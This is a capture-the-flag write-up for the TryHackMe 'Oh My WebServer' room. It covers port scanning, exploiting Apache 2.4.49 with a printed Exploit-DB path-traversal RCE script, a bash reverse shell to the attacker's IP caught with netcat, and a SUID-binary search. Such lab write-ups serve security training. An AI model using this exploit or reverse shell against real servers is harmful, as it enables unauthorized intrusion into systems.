---
Can you root me?
---

# Oh My WebServer — Writeup

## Overview
### Oh My WebServer — Writeup
### Oh My WebServer — Writeup
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/c1833021c98fa6c74fc125f4b34741ca.png)
### oh-My-Webserver
Start Machine
Deploy the machine attached to this task and happy hacking!
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.214.74 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.214.74:22
Open 10.10.214.74:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-27 10:57 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:57
Completed NSE at 10:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:57
Completed NSE at 10:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:57
Completed NSE at 10:57, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:57
Completed Parallel DNS resolution of 1 host. at 10:57, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:57
Scanning 10.10.214.74 [2 ports]
Discovered open port 80/tcp on 10.10.214.74
Discovered open port 22/tcp on 10.10.214.74
Completed Connect Scan at 10:57, 0.19s elapsed (2 total ports)
Initiating Service scan at 10:57
Scanning 2 services on 10.10.214.74
Completed Service scan at 10:57, 6.48s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.214.74.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:57
Completed NSE at 10:58, 7.38s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:58
Completed NSE at 10:58, 1.25s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:58
Completed NSE at 10:58, 0.00s elapsed
Nmap scan report for 10.10.214.74
Host is up, received user-set (0.19s latency).
Scanned at 2023-02-27 10:57:49 EST for 15s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0d188762a9379d391046d25160e56d4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMlfGBGWZkPg98VnvD+FVeesHsQwmtoJfMOMhifMjxD9AEluFQNVnoyxyQi5y9O2/AN/MO+l57li33lHiVjD1eglBjB3Lkzz3tpRJSmGn2Ug3jRypShkSJ9VkUVFElw8MXke62w3+9pi+S0Ub1DqcttGH8TqihiWvqJbJYnecqjdcka1uKPdPna0gleow9JiaAH3X4EMFdcXZDOGgnOaZId2mEXFDeNNYFZpS+EOcLgXaAp1NobUckE9NXvE73qw+pBNo69m3z4MG7/cJNIsQiFpm5yqgCKJGjhwGFp4zAMXOD23lj1g+iQlwrchwY5nBEHHae1PjQwLjwuWebjWR+bWPalPVYa4d8+15TjjgV8VW/Rac3rTX+A/buyVxUSMhkBtn7fQ2sLoMPPn7vRDo3ggGl5IZaYIvSYRDk9nadsZk+YKUCSgFf97z0PK278vbrPwjJTyyScAnjvs+oLnD/bAdja4uwOOS2CHehjzipVmWf7zR3srIfjZQ4aAUmeh8=
|   256 91185c2c5ef8993c9a1f0424300eaa9b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLf6FvNwGNtpra24lyJ4YWPqB8olwPXhKdr6gSW6Dc+oXdZJbQPtpD7cph3nvR9sQQnTKGiG69XyGKh0ervYI1U=
|   256 d1632a36dd94cf3c573e8ae88500caf6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEzBDIQu+cp4gApnTbTbtmqljyAcr/Za8goiY57VM+uq
80/tcp open  http    syn-ack Apache httpd 2.4.49 ((Unix))
|_http-server-header: Apache/2.4.49 (Unix)
|_http-favicon: Unknown favicon MD5: 02FD5D10B62C7BC5AD03F8B0F105323C
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-title: Consult - Business Consultancy Agency Template | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:58
Completed NSE at 10:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:58
Completed NSE at 10:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:58
Completed NSE at 10:58, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.68 seconds

Apache httpd 2.4.49 

https://www.exploit-db.com/exploits/50383

┌──(witty㉿kali)-[~/Downloads]
└─$ nano 50383.sh
                                                                            
┌──(witty㉿kali)-[~/Downloads]
└─$ echo '10.10.214.74' > targets.txt                           
                                                                            
┌──(witty㉿kali)-[~/Downloads]
└─$ cat 50383.sh 
#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done
```
```text
# PoC.sh targets.txt /etc/passwd
```

## Exploitation
```text
# PoC.sh targets.txt /bin/sh whoami

┌──(witty㉿kali)-[~/Downloads]
└─$ bash 50383.sh targets.txt /bin/sh whoami     
10.10.214.74
daemon

┌──(witty㉿kali)-[~/Downloads]
└─$ bash 50383.sh targets.txt /bin/sh '/bin/bash -c "bash -i >& /dev/tcp/10.8.19.103/1337 0>&1"'
10.10.214.74

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.214.74] 46792
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
daemon@4a70924bafa0:/bin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
daemon@4a70924bafa0:/bin$ whoami
whoami
daemon
daemon@4a70924bafa0:/bin$ cd /
cd /
daemon@4a70924bafa0:/$ ls -lah
ls -lah
total 76K
drwxr-xr-x   1 root root 4.0K Feb 23  2022 .
drwxr-xr-x   1 root root 4.0K Feb 23  2022 ..
-rwxr-xr-x   1 root root    0 Feb 23  2022 .dockerenv
drwxr-xr-x   1 root root 4.0K Oct  8  2021 bin
drwxr-xr-x   2 root root 4.0K Jun 13  2021 boot
drwxr-xr-x   5 root root  340 Feb 27 15:56 dev
drwxr-xr-x   1 root root 4.0K Feb 23  2022 etc
drwxr-xr-x   2 root root 4.0K Jun 13  2021 home
drwxr-xr-x   1 root root 4.0K Oct  8  2021 lib
drwxr-xr-x   2 root root 4.0K Sep 27  2021 lib64
drwxr-xr-x   2 root root 4.0K Sep 27  2021 media
drwxr-xr-x   2 root root 4.0K Sep 27  2021 mnt
drwxr-xr-x   2 root root 4.0K Sep 27  2021 opt
dr-xr-xr-x 170 root root    0 Feb 27 15:56 proc
drwx------   1 root root 4.0K Oct  8  2021 root
drwxr-xr-x   3 root root 4.0K Sep 27  2021 run
drwxr-xr-x   1 root root 4.0K Oct  8  2021 sbin
drwxr-xr-x   2 root root 4.0K Sep 27  2021 srv
dr-xr-xr-x  13 root root    0 Feb 27 15:56 sys
drwxrwxrwt   1 root root 4.0K Feb 23  2022 tmp
drwxr-xr-x   1 root root 4.0K Sep 27  2021 usr
drwxr-xr-x   1 root root 4.0K Sep 27  2021 var

daemon@4a70924bafa0:/$ find / -perm -4000 2>/dev/null | xargs ls -lah
find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root root        51K Jan 10  2019 /bin/mount
-rwsr-xr-x 1 root root        63K Jan 10  2019 /bin/su
-rwsr-xr-x 1 root root        35K Jan 10  2019 /bin/umount
-rwsr-xr-x 1 root root        53K Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root        83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root        63K Jul 27  2018 /usr/bin/passwd
-rwsr-xr-- 1 root messagebus  50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root       427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root        46K Sep 28  2021 /usr/local/apache2/bin/suexec

